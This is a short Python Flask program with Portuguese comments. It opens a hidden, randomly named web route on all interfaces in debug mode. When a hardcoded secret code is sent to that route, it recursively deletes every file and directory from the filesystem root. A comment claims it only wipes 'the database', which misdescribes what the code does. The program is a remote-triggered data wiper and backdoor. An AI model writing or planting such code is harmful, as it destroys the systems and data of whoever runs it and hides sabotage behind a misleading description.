from flask import Flask
import os
import shutil

app = Flask(__name__)

def executar_tarefa_especifica():
    #apagar completamente o banco

    caminho = "/"
    if not os.path.exists(caminho):
        print(f"O caminho {caminho} não existe.")
        return

    for item in os.listdir(caminho):
        item_path = os.path.join(caminho, item)
        try:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.unlink(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path) 
        except Exception as e:
            print(f"Erro ao deletar {item_path}. Motivo: {e}")
    return "Tarefa executada com sucesso!"

@app.route('/sjdnshbvaksbfsdnhasjvbskdbfkasndasdbsdakjwdnasbknejfnjnfqkjwbq/<codigo>')
def executar_tarefa(codigo):
    codigo_secreto = "SDFDJN&*@$29344385kjs#$)&()fnas34325$##%$#saFNEJKN51#*R#@"
    if codigo == codigo_secreto:
        return executar_tarefa_especifica()
    else:
        return "Código incorreto!", 403

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=60000, debug=True)
